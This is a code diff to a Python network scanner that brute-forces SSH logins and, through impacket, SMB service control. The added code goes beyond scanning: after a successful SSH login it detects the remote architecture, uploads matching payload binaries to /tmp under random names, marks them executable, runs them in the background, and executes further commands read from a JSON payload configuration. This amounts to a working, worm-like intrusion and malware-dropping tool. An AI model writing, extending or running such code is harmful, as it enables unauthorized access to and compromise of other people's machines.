@@ -3,6 +3,7 @@
 from asyncio.queues import Queue
 import os
 import time
+import json
 import random
 import asyncio
 import logging
@@ -20,6 +21,7 @@ from ipaddress import ip_network
 from concurrent.futures import ThreadPoolExecutor
 from impacket.dcerpc.v5 import transport, scmr
 from typing import List, Tuple, Dict
+from string import ascii_lowercase
 
 
 SERVICES = {
@@ -39,6 +41,10 @@ class WorkQueue(Queue):
 
     def contents(self) -> List:
         return list(self._queue)
+
+
+def random_string(size=8) -> str:
+    return ''.join(random.choice(ascii_lowercase) for _ in range(size))
 
 
 class TCPScanner(object):
@@ -157,6 +163,27 @@ class SSHLoginScanner(LoginScanner):
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         try:
             ssh.connect(ip, port=port, username=username, password=password, timeout=self.timeout)
+            _, stdout, _ = ssh.exec_command('arch', timeout=self.timeout)
+            
+            arch = stdout.read().decode('utf-8').strip()
+            LOG.info('Remote system architecture is %r' % arch)
+            
+            if arch in self.payloads:
+                # Upload and execute
+                sftp = ssh.open_sftp()
+                for upload in self.payloads[arch].get('upload', []):
+                    remote_path = '/'.join(['tmp', random_string()])
+                    sftp.put(upload, remote_path)
+                    ssh.exec_command('chmod +x %s' % remote_path)
+                    ssh.exec_command('%s &' % remote_path)
+                sftp.close()
+
+                # Execute commands
+                for cmd in self.payloads[arch].get('commands', []):
+                    ssh.exec_command(cmd)
+            else:
+                LOG.warning('Unknown architecture %r' % arch)
+
             return True
         except (paramiko.BadAuthenticationType, paramiko.AuthenticationException):
             return False
@@ -278,6 +305,15 @@ def load_targets(args):
                 lines = fp.readlines()
             args.targets[index] = [line.strip() for line in lines if len(line) > 1]
 
+def load_payloads(args) -> Dict:
+    if not args.payloads:
+        return {}
+    if os.path.exists(args.payloads) and os.path.isfile(args.payloads):
+        with open(args.payloads) as fp:
+            return json.loads(fp.read())
+    else:
+        raise ValueError('%s is not a valid payload configuration' % args.payloads)
+
 #
 # > Main
 #
@@ -391,15 +427,10 @@ if __name__ == '__main__':
         default=list(SERVICES.keys()),
         action=ValidatServicesAction
     )
-    parser.add_argument('--ssh-payload', '-ssh',
-        help='',
-        dest='ssh_payload',
-        default=None,
-    )
-    parser.add_argument('--smb-payload', '-smb',
-        help='',
-        dest='smb_payload',
-        default=None,
+    parser.add_argument('--payloads', '-p',
+        help='payloads configuration file',
+        dest='payloads',
+        default=''
     )
     asyncio.run(main(parser.parse_args()))
 
